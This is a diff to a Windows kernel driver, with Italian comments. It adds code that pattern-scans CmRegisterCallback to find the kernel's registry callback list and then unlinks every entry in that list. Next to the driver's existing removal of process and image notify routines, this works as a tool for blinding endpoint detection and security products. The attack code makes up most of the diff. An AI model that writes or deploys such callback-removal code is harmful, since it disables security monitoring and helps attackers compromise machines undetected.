@@ -199,6 +199,76 @@ UINT64 FindLoadImageNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE 
 
     return notifyArrayAddress;
 }
+//CmRegistercallback----1st call---- > CmpRegisterCallbackInternal----5th call oppure subito dopo(quindi 9 0xcc prima)----->CmpInsertCallbackInListByAltitude
+// -- primo LEA-- > CallbackListHead
+
+UINT64 FindRegCallbackNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
+    UINT64 routineAddress = 0;
+    UINT64 tempAddress = 0;
+	UINT64 CmpInsertCallbackInListByAltitudeAddress = 0;
+    UINT64 notifyArrayAddress = 0;
+    UNICODE_STRING routineName;
+
+    UNREFERENCED_PARAMETER(kernelBase);
+    UNREFERENCED_PARAMETER(callbackType);
+    RtlInitUnicodeString(&routineName, L"CmRegisterCallback");
+
+
+    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
+    if (!routineAddress) {
+        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get CmRegistercallback\n", DRIVER_NAME);
+        return 0;
+    }
+
+    for (int offset = 0; offset < 0x100; offset++) {
+        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
+        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
+            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));
+            tempAddress = routineAddress + offset + 5 + relativeOffset;
+            break;
+        }
+	}
+
+    if (!tempAddress) {
+        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetLoadImageNotifyRoutine\n", DRIVER_NAME);
+        return 0;
+    }
+    //CmpRegisterCallbackInternal----5th call oppure subito dopo(quindi 9 0xcc prima)----->CmpInsertCallbackInListByAltitude
+    for (int offset = 0; offset < 0x200; offset++) {
+        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
+        unsigned char prevPrefix = *((unsigned char*)(tempAddress + offset - 1));
+
+        if ((prefix == 0xcc && prevPrefix == 0xcc) && (*(unsigned char*)(tempAddress + offset + 1) == 0x48)) { // 
+            //LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));
+
+            CmpInsertCallbackInListByAltitudeAddress = tempAddress + offset + 1;
+            break;
+        }
+    }
+    if (!CmpInsertCallbackInListByAltitudeAddress) {
+        DbgPrintEx(0, 0, "[%s] Failed to find CmpInsertCallbackInListByAltitudeAddress instruction in CmRegistercallback\n", DRIVER_NAME);
+        return 0;
+	}
+	DbgPrintEx(0, 0, "[%s] CmpInsertCallbackInListByAltitudeAddress: 0x%llx\n", DRIVER_NAME, CmpInsertCallbackInListByAltitudeAddress);
+    
+    for (int offset = 0; offset < 300; offset++) {
+        unsigned char prefix = *((unsigned char*)(CmpInsertCallbackInListByAltitudeAddress + offset));
+        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(CmpInsertCallbackInListByAltitudeAddress + offset + 1) == 0x8D)) { // LEA
+            LONG relativeOffset = *((LONG*)(CmpInsertCallbackInListByAltitudeAddress + offset + 3));
+
+            notifyArrayAddress = CmpInsertCallbackInListByAltitudeAddress + offset + 7 + relativeOffset;
+            break;
+        }
+    }
+    if (!notifyArrayAddress) {
+        DbgPrintEx(0, 0, "[%s] Failed to find LEA instruction in CmpInsertCallbackInListByAltitudeAddress\n", DRIVER_NAME);
+        return 0;
+	}
+
+	return notifyArrayAddress;
+}
+
+
 
 NTSTATUS SearchModules(ULONG64 ModuleAddr, ModulesData* ModuleFound) {
     NTSTATUS status = STATUS_SUCCESS;
@@ -281,6 +351,22 @@ NTSTATUS DeleteNotifyEntry(ULONG64 procNotifyArrayAddr, int  indexToRemove) {
         return STATUS_UNSUCCESSFUL;
 	}
 }
+
+NTSTATUS DeleteRegCallbackEntry(ULONG64 regCallbackArrayAddr) {
+	LIST_ENTRY* listHead = (LIST_ENTRY*)regCallbackArrayAddr;
+    listHead->Flink = listHead;
+	listHead->Blink = listHead;
+
+    if (listHead->Flink == listHead && listHead->Blink == listHead) {
+        DbgPrintEx(0, 0, "[%s] Successfully removed registry callback entry\n", DRIVER_NAME);
+        return STATUS_SUCCESS;
+    }
+    else {
+        DbgPrintEx(0, 0, "[%s] Failed to remove registry callback entry\n", DRIVER_NAME);
+        return STATUS_UNSUCCESSFUL;
+	}
+}
+
 
 UINT64 FindKernelBase() {
     UNICODE_STRING functionName;
